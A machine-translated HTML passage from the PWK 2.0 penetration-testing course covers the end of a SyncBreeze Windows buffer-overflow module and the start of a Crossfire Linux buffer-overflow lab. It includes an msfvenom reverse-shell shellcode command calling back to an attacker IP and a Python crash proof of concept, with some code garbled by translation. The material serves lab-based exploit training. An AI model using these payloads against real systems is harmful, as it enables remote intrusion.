<div style="position:absolute;top:88345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExitThread</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> API</font><font style="vertical-align: inherit;">完全崩溃服务</font><font style="vertical-align: inherit;">，这只会终止</font></font></nobr></div>
<div style="position:absolute;top:88364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序的受影响线程。</font><font style="vertical-align: inherit;">这将使我们的漏洞利用工作不会中断通常的</font></font></nobr></div>
<div style="position:absolute;top:88383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SyncBreeze 服务器的操作，并允许我们重复利用服务器并退出</font></font></nobr></div>
<div style="position:absolute;top:88403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell 而不会关闭服务。</font></font></nobr></div>
<div style="position:absolute;top:88436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要指示</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 shellcode 生成期间</font><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExitThread</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法，我们可以使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:88456;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EXITFUNC=thread</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，如下面的命令所示：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88507;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">thread -fc –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88526;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 364 - 生成 shellcode 以使用 ExitThread</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88557;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.10.1</font></font></i></nobr></div>
<div style="position:absolute;top:88557;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锻炼</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 更新漏洞利用，以便 SyncBreeze 在利用后仍能运行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88622;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.10.2</font></font></i></nobr></div>
<div style="position:absolute;top:88622;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外一英里练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows VM 的 Tools 文件夹中，有三个名为 VulnApp1.exe 的应用程序，</font></font></nobr></div>
<div style="position:absolute;top:88676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VulnApp2.exe 和 VulnApp3.exe，每个都包含一个漏洞。</font><font style="vertical-align: inherit;">相关的 Python 证明</font></font></nobr></div>
<div style="position:absolute;top:88695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件夹中也存在概念脚本。</font><font style="vertical-align: inherit;">使用 PoC，为每个漏洞编写漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:88714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易受攻击的应用程序。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:88752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.3 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们发现并利用了 SyncBreeze 应用程序中的漏洞。</font><font style="vertical-align: inherit;">甚至</font></font></nobr></div>
<div style="position:absolute;top:88812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管这是一个已知漏洞，但我们完成了“发现”所需的步骤并</font></font></nobr></div>
<div style="position:absolute;top:88832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不依赖于以前的漏洞研究。</font><font style="vertical-align: inherit;">这基本上复制了发现的过程</font></font></nobr></div>
<div style="position:absolute;top:88851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并利用远程缓冲区溢出。</font></font></nobr></div>
<div style="position:absolute;top:88884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个过程需要几个步骤。</font><font style="vertical-align: inherit;">首先，我们在代码中发现了一个漏洞（无法访问</font></font></nobr></div>
<div style="position:absolute;top:88903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到源）并生成导致溢出并授予我们控制权的应用程序输入</font></font></nobr></div>
<div style="position:absolute;top:88922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键 CPU 寄存器。</font><font style="vertical-align: inherit;">接下来，我们操纵内存以获得可靠的远程代码执行和</font></font></nobr></div>
<div style="position:absolute;top:88942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清理漏洞利用以避免使目标应用程序崩溃。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:89275;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="76"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 76 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:89308;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:90385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:90385;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:90385;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">396</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:89398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.3.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:89424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12. Linux 缓冲区溢出</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本单元中，我们将通过利用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crossfire</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来介绍 Linux 缓冲区溢出</font><font style="vertical-align: inherit;">，这是一个基于 Linux 的在线</font></font></nobr></div>
<div style="position:absolute;top:89488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多人角色扮演游戏。</font></font></nobr></div>
<div style="position:absolute;top:89520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具体来说，Crossfire 1.9.0</font><font style="vertical-align: inherit;">在传递一个</font><font style="vertical-align: inherit;">基于网络的缓冲区溢出</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">325</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时</font><font style="vertical-align: inherit;">容易受到攻击。</font></font></nobr></div>
<div style="position:absolute;top:89540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">超过 4000 字节的字符串到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">setup sound</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">为了调试应用程序，</font></font></nobr></div>
<div style="position:absolute;top:89559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用 Evans Debugger ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EDB</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，</font><font style="vertical-align: inherit;">由 Evan Teran 编写的</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">326</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它为我们提供了一个熟悉的-</font></font></nobr></div>
<div style="position:absolute;top:89579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外观调试环境，灵感来自 Ollydbg。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">327</font></font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:89616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.1 关于 DEP、ASLR 和 Canary</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最近的 Linux 内核和编译器已经实现了各种内存保护技术</font></font></nobr></div>
<div style="position:absolute;top:89677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据执行保护</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(DEP)、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">328</font></font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址空间布局随机化</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(ASLR)、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">329</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:89696;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈金丝雀</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">330</font></font></font></nobr></div>
<div style="position:absolute;top:89729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于绕过这些保护机制超出了本模块的范围，我们的测试</font></font></nobr></div>
<div style="position:absolute;top:89748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crossfire 版本的编译没有堆栈粉碎保护（堆栈金丝雀），ASLR，</font></font></nobr></div>
<div style="position:absolute;top:89768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 DEP。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:89805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.2 复制崩溃</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的测试环境将包含一个专用的 Linux Debian 实验室客户端，我们将在其中运行和</font></font></nobr></div>
<div style="position:absolute;top:89866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试易受攻击的应用程序，以及我们将在其中启动远程应用程序的本地 Kali Linux 机器</font></font></nobr></div>
<div style="position:absolute;top:89885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发。</font></font></nobr></div>
<div style="position:absolute;top:89918;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了复制崩溃，我们首先将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rdesktop 连接</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到我们专用的 Debian Linux 客户端（使用</font></font></nobr></div>
<div style="position:absolute;top:89938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制面板中提供的凭据）。</font><font style="vertical-align: inherit;">连接后，我们将</font><font style="vertical-align: inherit;">通过以下方式</font><font style="vertical-align: inherit;">启动</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终端</font></font></nobr></div>
<div style="position:absolute;top:89957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统工具</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菜单和运行交锋：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /usr/games/crossfire/bin/</font></font></font></b></nobr></div>
<div style="position:absolute;top:90026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:/usr/games/crossfire/bin# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./crossfire</font></font></font></b></nobr></div>
<div style="position:absolute;top:90043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:90060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欢迎使用 CrossFire v1.9.0</font></font></nobr></div>
<div style="position:absolute;top:90077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 1994 Mark Wedel。</font></font></nobr></div>
<div style="position:absolute;top:90094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 1992 Frank Tore Johansen。</font></font></nobr></div>
<div style="position:absolute;top:90127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------注册SIGPIPE</font></font></nobr></div>
<div style="position:absolute;top:90145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">初始化插件</font></font></nobr></div>
<div style="position:absolute;top:90162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件目录是/usr/games/crossfire/lib/crossfire/plugins/</font></font></nobr></div>
<div style="position:absolute;top:90179;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt; 加载插件：cfanim.so</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:90235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">325 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2006 年），https://www.exploit-db.com/exploits/1582/</font></font></font></nobr></div>
<div style="position:absolute;top:90255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">326 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（永恒，2019），https://github.com/eteran/edb-debugger</font></font></font></nobr></div>
<div style="position:absolute;top:90275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">327 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/OllyDbg</font></font></font></nobr></div>
<div style="position:absolute;top:90295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">328 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Executable_space_protection</font></font></font></nobr></div>
<div style="position:absolute;top:90315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">329 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Address_space_layout_randomization</font></font></font></nobr></div>
<div style="position:absolute;top:90335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">330 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:90463;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="77"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 77 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:90496;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:91573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:91573;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:91573;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">397</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CFAnim 2.0a 初始化</font></font></nobr></div>
<div style="position:absolute;top:90608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CFAnim 2.0a 后初始化</font></font></nobr></div>
<div style="position:absolute;top:90625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在等待连接...</font></font></nobr></div>
<div style="position:absolute;top:90645;left:277"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 365 - 通过终端启动易受攻击的应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦 crossfire 启动，它将接受传入的网络连接。</font><font style="vertical-align: inherit;">接下来，我们将推出</font></font></nobr></div>
<div style="position:absolute;top:90694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EDB 调试器通过运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">edb</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">edb</font></font></font></b></nobr></div>
<div style="position:absolute;top:90746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动edb版本：0.9.22</font></font></nobr></div>
<div style="position:absolute;top:90763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请在以下位置报告错误和请求：https://github.com/eteran/edb-debugger/issues</font></font></nobr></div>
<div style="position:absolute;top:90779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比较版本：[2325] [2326]</font></font></nobr></div>
<div style="position:absolute;top:90799;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 366 - 通过终端启动调试器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EDB 的布局与其他流行的调试工具类似，如图 222 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:91282;left:387"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 222：EDB 界面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要查看包括 PID 和所有者在内的可用进程，我们</font><font style="vertical-align: inherit;">将从“</font><i><font style="vertical-align: inherit;">文件”</font></i><font style="vertical-align: inherit;">菜单中</font><font style="vertical-align: inherit;">选择“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">附加</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">” </font><font style="vertical-align: inherit;">。</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:91333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后我们可以使用过滤器选项来搜索特定进程，在我们的例子中是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crossfire</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:91352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择它，然后单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">附加到它：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:91651;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="78"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 78 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:91684;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:92761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:92761;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:92761;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">398</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92095;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 223：EDB - 可附加进程窗口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们最初附加到进程时，它将被暂停。</font><font style="vertical-align: inherit;">要运行它，我们只需单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮。</font></font></nobr></div>
<div style="position:absolute;top:92145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据应用程序在调试器中的工作方式，它可能会遇到额外的断点</font></font></nobr></div>
<div style="position:absolute;top:92164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在让应用程序运行之前。</font><font style="vertical-align: inherit;">在这种情况下，我们只需再按一次</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮</font></font></nobr></div>
<div style="position:absolute;top:92184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:92654;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 224：在调试器中附加应用程序 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:92839;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="79"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 79 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:92872;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:93949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:93949;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:93949;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">399</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:92962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.2.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们将调试器附加到 Crossfire 应用程序，我们将使用以下证明-</font></font></nobr></div>
<div style="position:absolute;top:93002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们根据公开漏洞利用信息创建的概念代码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:93054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:93088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 = "10.11.0.128"</font></font></nobr></div>
<div style="position:absolute;top:93122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">崩溃 = "\x41" * 4379</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:93156;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer = "\x11(设置声音" + crash + "\x90\x00#"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
<div style="position:absolute;top:93207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "[*] 发送恶意缓冲区..."</font></font></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:93241;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.connect（（主机，13327））</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 s.recv(1024)</font></font></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
